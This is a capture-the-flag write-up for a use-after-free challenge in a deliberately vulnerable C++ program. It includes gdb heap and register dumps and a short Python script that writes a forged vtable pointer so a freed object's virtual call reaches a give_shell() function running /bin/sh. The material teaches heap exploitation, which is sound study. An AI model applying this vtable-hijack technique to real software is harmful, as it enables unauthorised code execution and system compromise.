# Uaf
Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation. If after freeing a memory location, a program does not clear the pointer to that memory, an attacker can use the error to hack the program.

<p align="center"><img  src="https://i.ytimg.com/vi/bSR-RDdAwYg/maxresdefault.jpg" width=80% height=80%/></div>

To solve this challenge I first had to read up some stuff on how heap memory works. In particular, how [glibc](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) works in linux.


## Soluiton

First of all I read the .ccp code that is provided to us.
Initially, two objects are allocated in main (Man and Woman) of Human class.
```
int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);
...
```

Looking at Human class, I immediately thought I need to find a way to use the `give_shell()` function.
```
class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};
```

In main function there's a switch statement, where we can choose 3 options:
* 1 - It calls the `introduce()` Human class method.
* 2 - It reads the file passed through args.
* 3 - It free the memory space of the two object (Man and Woman).

```
switch(op){
    case 1:
      m->introduce();
      w->introduce();
      break;
    case 2:
      len = atoi(argv[1]);
      data = new char[len];
      read(open(argv[2], O_RDONLY), data, len);
      cout << "your data is allocated" << endl;
      break;
    case 3:
      delete m;
      delete w;
      break;
    default:
      break;
  }
```

To solve this challenge we need to free the memory allocated for Man and Woman objects. After that we choose the second option, so the program read a file setted by args (the len variable is also setted by args). 

In this way the freed memory areas are used to save the contents of the file. Finally, when option 1 is chosen, the program calls the Man and Woman objects that have been overwritten and reads the contents of the file.
Soo... what we need to write in this file??

Using gdb as a debugger, I have found some useful hint to solve this CTF.
* Firtsly I noticed that the program allocates 24 bytes of memory for chunk. This could be helpful to set the size in input to make it fit within the chunk size.

```
   0x400ef7 <main+51>    lea    r12, [rbp - 0x50]
   0x400efb <main+55>    mov    edi, 0x18
 ► 0x400f00 <main+60>    call   0x400d90                      <0x400d90>
```



When the delete function is called to deallocate objects, chunks in heap memory are labeled "overwritable". By setting the right size I managed to save the contents of my file in the memory areas where the Man and Woman objects used to be.


This is the heap memory after deallocating the two objects.
```
...

Allocated chunk | PREV_INUSE
Addr: 0x130f290
Size: 0x11c11

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x1320ea0
Size: 0x31
fd: 0x1320

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x1320ed0
Size: 0x21
fd: 0x1320

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x1320ef0
Size: 0x31
fd: 0x1321d90

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x1320f20
Size: 0x21
fd: 0x1321dc0

Allocated chunk | PREV_INUSE
Addr: 0x1320f40
Size: 0x411

...
```

And this instead is it after choosing option 2 twice, then after saving the file twice.
```
Allocated chunk | PREV_INUSE
Addr: 0x130f290
Size: 0x11c11

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x1320ea0
Size: 0x31
fd: 0x1320

Allocated chunk | PREV_INUSE
Addr: 0x1320ed0
Size: 0x21

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x1320ef0
Size: 0x31
fd: 0x1321d90

Allocated chunk | PREV_INUSE
Addr: 0x1320f20
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x1320f40
Size: 0x411

```

This is the assembly code of option 1:
```
   0x400fc3 <main+255>    cmp    eax, 1
   0x400fc6 <main+258>    je     main+265                      <main+265>
    ↓
 ► 0x400fcd <main+265>    mov    rax, qword ptr [rbp - 0x38]
   0x400fd1 <main+269>    mov    rax, qword ptr [rax]
   0x400fd4 <main+272>    add    rax, 8
   0x400fd8 <main+276>    mov    rdx, qword ptr [rax]
   0x400fdb <main+279>    mov    rax, qword ptr [rbp - 0x38]
   0x400fdf <main+283>    mov    rdi, rax
```
Looking at registries I noticed that in `$rax` is passed the address of `give_shell()` method and after that is increased by 8.

```
*RAX  0x13cfee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push rbp
 RBX  0x13cff30 —▸ 0x401550 —▸ 0x40117a (Human::give_shell()) ◂— push rbp
 RCX  0x7ffed86a7230 —▸ 0x7ff615029618 (std::string::_Rep::_S_empty_rep_storage+24) ◂— 0x0
 RDX  0x7ffed86a7308 ◂— 0x7ff600000001
 RDI  0x7ff615029600 (std::string::_Rep::_S_empty_rep_storage) ◂— 0x0
 RSI  0x0
 R8   0xffffffff
...
```

So now we know that twe need a pointer to `0x401570`. I wrote a simple python code that subtract that address by 8 and then save the result in a file

```
...
give_shell_address = hex(0x401570 - 0x8)[2:]   # remove the '0x' prefix from the hex string
input_file_value = b"" + give_shell_address.decode('hex')[::-1] # convert bytes in little endian

with open("./input", "wb") as f:
    f.write(input_file_value)
...
```
This way when the heap memory allocated for the Man and Woman objects is read, the value of our file will be read instead. By adding the value of the file by 8, a pointer to the give_shell() function will be obtained and we will be able to read the flag.